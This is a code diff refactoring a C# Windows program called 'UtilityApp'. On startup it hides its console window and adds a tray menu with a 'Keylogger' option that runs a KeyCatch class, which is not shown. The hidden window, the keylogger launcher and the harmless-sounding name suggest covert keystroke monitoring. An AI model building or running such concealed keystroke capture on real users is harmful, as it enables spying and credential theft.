@@ -1,41 +1,36 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Drawing;
-using System.Diagnostics;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using System.Threading;
 using System.Runtime.InteropServices;
-using System.IO;
+using System.Threading;
+using System.Windows.Forms;
 
 namespace UtilityApp
 {
-    enum Acts { NOTHING, EXIT, KEYLOG, BUSY };
+    internal enum Acts
+    { NOTHING, EXIT, KEYLOG, BUSY };
 
-    class Program
+    internal class Program
     {
         //Menu Options
         private static Acts acts = Acts.NOTHING;
 
         //Icon stuffs
         public static ContextMenu menu;
+
         public static MenuItem mnuExit;
         public static MenuItem mnuKLog;
         public static NotifyIcon notificationIcon;
 
         //Key Logger
-        static KeyCatch keyLog = new KeyCatch();
+        private static KeyCatch keyLog = new KeyCatch();
 
         //Lazy WriteLine function
-        static void WL(string line)
+        private static void WL(string line)
         {
             Console.WriteLine(line);
             return;
         }
 
-        static void buildMenu()
+        private static void BuildMenu()
         {
             menu = new ContextMenu();
             mnuExit = new MenuItem("Exit");
@@ -43,11 +38,11 @@ namespace UtilityApp
             menu.MenuItems.Add(0, mnuExit);
             menu.MenuItems.Add(1, mnuKLog);
 
-            mnuExit.Click += new EventHandler(mnuExit_Click);
-            mnuKLog.Click += new EventHandler(mnuKLog_Click);
+            mnuExit.Click += new EventHandler(MnuExit_Click);
+            mnuKLog.Click += new EventHandler(MnuKLog_Click);
         }
 
-        static void Main(string[] args)
+        private static void Main(string[] args)
         {
             var handle = GetConsoleWindow();
             ShowWindow(handle, 0);
@@ -55,7 +50,7 @@ namespace UtilityApp
             Thread notifyThread = new Thread(
                 delegate ()
                 {
-                    buildMenu();
+                    BuildMenu();
 
                     notificationIcon = new NotifyIcon()
                     {
@@ -83,10 +78,12 @@ namespace UtilityApp
                         acts = Acts.NOTHING;
                         notificationIcon.Visible = true;
                         break;
+
                     case Acts.EXIT:
-                        endApp();
+                        EndApp();
                         acts = Acts.NOTHING;
                         break;
+
                     case Acts.NOTHING:
                     default:
                         //acts = Acts.NOTHING;
@@ -94,11 +91,11 @@ namespace UtilityApp
                         break;
                 }
             }
-            endApp();
+            EndApp();
         }
 
         //Generates the main menu
-        static bool Menu()
+        private static bool Menu()
         {
             Console.Clear();
             WL("Select one");
@@ -120,9 +117,11 @@ namespace UtilityApp
                     case 3:
                     case 4:
                         break;
+
                     case 5:
                         keyLog.Run();
                         break;
+
                     default:
                         //WL(run.ToString());
                         return false;
@@ -131,110 +130,32 @@ namespace UtilityApp
             }
             catch
             {
-
             }
             return true;
         }
 
-        static void endApp()
+        private static void EndApp()
         {
             notificationIcon.Dispose();
             Environment.Exit(0);
         }
 
-        static void mnuExit_Click(object sender, EventArgs e)
+        private static void MnuExit_Click(object sender, EventArgs e)
         {
             WL("Closing");
             acts = Acts.EXIT;
-            endApp();
+            EndApp();
         }
-        static void mnuKLog_Click(object sender, EventArgs e)
+
+        private static void MnuKLog_Click(object sender, EventArgs e)
         {
             acts = Acts.KEYLOG;
         }
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
     }
-
-    /*
-        
-
-        private static void menuItem_Click(object Sender, EventArgs e)
-        {
-            // Close the form, which closes the application.
-            Debug.WriteLine("ASDASDASDASDASDASD");
-            Application.Exit();
-        }
-
-        [STAThread]
-        static void Main(string[] args)
-        {
-            tray.Icon = Properties.Resources.AppIco;
-            
-            contextMenu.MenuItems.AddRange( new System.Windows.Forms.MenuItem[] { menuItem });
-            
-            menuItem.Index = 0;
-            menuItem.Text = "E&xit";
-            menuItem.Click += new System.EventHandler(menuItem_Click);
-            
-            tray.ContextMenu = contextMenu;
-
-
-            tray.Visible = true;
-
-            int i = 0;
-
-            while (Menu())
-            {
-                WL(i.ToString());
-                i++;
-            }
-            
-        }
-
-
-        static bool Menu()
-        {
-            Console.Clear();
-            WL("Select one");
-            WL("--------------");
-            WL("1)            ");
-            WL("2)            ");
-            WL("4)            ");
-            WL("5) Keylogger  ");
-            WL("6) Quit       ");
-            WL("--------------");
-            //Application.Run();
-            try
-            {
-                int run = int.Parse(Console.ReadLine());
-                switch (run)
-                {
-                    case 1:
-                    case 2:
-                    case 3:
-                    case 4:
-                        break;
-                    case 5:
-                        keyLog.Run();
-                        break;
-                    default:
-                        //WL(run.ToString());
-                        return false;
-                        break;
-                }
-            }
-            catch
-            {
-
-            }
-            return true;
-        }
-
-    }*/
 }
